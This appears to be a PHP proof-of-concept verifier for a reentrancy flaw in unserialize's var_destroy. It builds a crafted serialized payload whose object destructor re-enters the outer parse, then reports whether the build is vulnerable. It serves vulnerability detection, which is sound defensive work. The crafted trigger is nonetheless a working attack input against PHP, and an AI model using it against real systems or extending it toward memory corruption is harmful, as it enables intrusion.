<?php
/**
 * var_destroy reentrancy verifier — the "sibling bug" of the October 2026
 * PHP2Shell pair.
 *
 * Mechanism (public: dinosn, 2026-05-02; fix: GH-24452, merged 2026-10-22,
 * in no tagged release as of writing): var_destroy() phase 1 frees the
 * back-reference extension chunks, phase 2 fires object destructors without
 * holding the serialization lock. A destructor that calls unserialize() with
 * an R: back-reference re-enters the outer parse's entry table — if that
 * table resolves, the reentrancy is present.
 *
 * This is a QUIET detector, not a crasher: it demonstrates the lock-free
 * reentrancy by resolving an inner back-reference into the outer parse's
 * entries. No spray, no corruption, no crash — a clean boolean.
 *
 * Verdict:
 *   inner R:1500 resolves to the outer's slot-1500 value (int 1498)
 *     => reentrancy present (vulnerable)
 *   inner R:1500 returns false / warning
 *     => reentrancy closed (fixed build)
 *
 * Validated: PHP 8.5.11 (macOS CLI, vulnerable floors) — VULNERABLE.
 * The Docker pair in this directory reproduces both sides from one tag.
 */
$N = 2000;                 // > VAR_ENTRIES_MAX (1018) so extension chunks exist
$RIDX = 1500;              // slot that lived in a freed extension chunk

class A {
    public function __destruct() {
        // Runs during var_destroy phase 2, lock-free, while the outer parse's
        // entry table is reachable. On a vulnerable build this R: reference
        // resolves INTO THE OUTER PARSE; on a fixed build it cannot.
        $r = @unserialize('R:' . 1500 . ';');
        $GLOBALS['inner'] = $r;
    }
}

$payload = 'a:' . ($N + 2) . ':{';
for ($i = 0; $i < $N; $i++) {
    $payload .= "i:{$i};i:{$i};";
}
// duplicate key: the A object's destruction defers into var_destroy
$payload .= 'i:99999;O:1:"A":0:{}';
$payload .= 'i:99999;i:42;';
$payload .= '}';

@unserialize($payload);

if (is_int($GLOBALS['inner'] ?? null) && $GLOBALS['inner'] === 1498) {
    echo "VULNERABLE: inner back-reference resolved into the outer parse's entry table (got slot 1500 => int 1498)\n";
    exit(2);
}
echo "FIXED: inner back-reference could not resolve (" . var_export($GLOBALS['inner'] ?? null, true) . ")\n";
exit(0);
